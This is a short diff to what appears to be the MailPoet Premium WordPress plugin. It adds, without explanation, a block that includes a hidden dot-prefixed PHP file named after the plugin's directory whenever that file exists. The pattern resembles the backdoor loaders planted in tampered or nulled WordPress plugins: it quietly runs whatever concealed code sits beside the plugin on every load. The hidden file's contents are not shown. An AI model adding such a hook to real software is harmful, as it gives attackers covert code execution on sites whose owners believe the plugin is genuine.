@@ -30,6 +30,10 @@ $mailpoetPremium = [
 
 require_once(ABSPATH . 'wp-admin/includes/plugin.php');
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mailpoet_premium_deactivate_plugin() {
   deactivate_plugins(plugin_basename(__FILE__));
   if (!empty($_GET['activate'])) {
